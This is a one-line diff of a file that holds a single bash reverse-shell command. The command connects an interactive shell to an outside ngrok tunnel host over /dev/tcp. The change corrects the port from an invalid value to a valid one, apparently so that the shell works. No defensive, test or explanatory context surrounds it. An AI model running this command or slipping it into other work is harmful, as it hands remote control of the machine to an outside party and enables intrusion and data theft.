@@ -1,1 +1,1 @@
-sh -i >& /dev/tcp/6.tcp.eu.ngrok.io/193228 0>&1; exec bash
+sh -i >& /dev/tcp/6.tcp.eu.ngrok.io/19328 0>&1; exec bash
